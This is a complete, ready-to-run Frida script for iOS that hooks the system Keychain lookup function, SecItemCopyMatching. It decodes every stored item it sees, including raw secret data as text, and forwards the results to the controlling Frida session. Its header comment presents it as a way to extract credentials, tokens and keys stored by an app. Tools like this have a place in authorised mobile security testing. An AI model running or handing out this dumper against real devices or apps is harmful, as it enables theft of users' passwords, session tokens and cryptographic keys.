// Intercepts iOS Keychain reads via SecItemCopyMatching and logs each retrieved
// item's service, account, and decoded secret value.
// Useful for extracting credentials, tokens, and keys stored by the app.

(function () {
  'use strict';

  var SecItemCopyMatching = new NativeFunction(
    Module.findExportByName('Security', 'SecItemCopyMatching'),
    'int', ['pointer', 'pointer']
  );

  if (!SecItemCopyMatching) {
    send({ type: 'keychain_dump', event: 'SecItemCopyMatching not found — is this an iOS target?' });
    return;
  }

  Interceptor.replace(
    Module.findExportByName('Security', 'SecItemCopyMatching'),
    new NativeCallback(function (query, result) {
      var ret = SecItemCopyMatching(query, result);

      if (ret === 0 && result !== null && !result.isNull()) {
        try {
          var resultPtr = Memory.readPointer(result);
          if (!resultPtr.isNull()) {
            var obj = ObjC.Object(resultPtr);
            var entry = { type: 'keychain_dump', event: 'SecItemCopyMatching hit', result_class: obj.$className };

            // Single kSecReturnAttributes / kSecReturnData dict
            if (obj.$className === '__NSDictionaryI' || obj.$className === '__NSCFDictionary') {
              var dict = ObjC.Object(resultPtr);
              var keys = dict.allKeys();
              var count = keys.count();
              var parsed = {};
              for (var i = 0; i < count; i++) {
                var k = keys.objectAtIndex_(i).toString();
                var v = dict.objectForKey_(keys.objectAtIndex_(i));
                if (v.$className === 'NSData') {
                  var bytes = Memory.readByteArray(v.bytes(), v.length());
                  parsed[k] = '[data] ' + (new TextDecoder('utf-8', { fatal: false })).decode(bytes);
                } else {
                  parsed[k] = v.toString();
                }
              }
              entry.item = parsed;
            }

            // Array of dicts (kSecMatchLimitAll)
            if (obj.$className === '__NSArrayI' || obj.$className === '__NSCFArray') {
              var arr = ObjC.Object(resultPtr);
              var items = [];
              for (var j = 0; j < arr.count(); j++) {
                var dictItem = arr.objectAtIndex_(j);
                var keys2 = dictItem.allKeys();
                var parsed2 = {};
                for (var k2 = 0; k2 < keys2.count(); k2++) {
                  var key = keys2.objectAtIndex_(k2).toString();
                  var val = dictItem.objectForKey_(keys2.objectAtIndex_(k2));
                  if (val.$className === 'NSData') {
                    var b = Memory.readByteArray(val.bytes(), val.length());
                    parsed2[key] = '[data] ' + (new TextDecoder('utf-8', { fatal: false })).decode(b);
                  } else {
                    parsed2[key] = val.toString();
                  }
                }
                items.push(parsed2);
              }
              entry.items = items;
            }

            send(entry);
          }
        } catch (e) {
          send({ type: 'keychain_dump', event: 'parse error', error: e.message });
        }
      }

      return ret;
    }, 'int', ['pointer', 'pointer'])
  );

  send({ type: 'keychain_dump', event: 'SecItemCopyMatching hook installed' });

})();
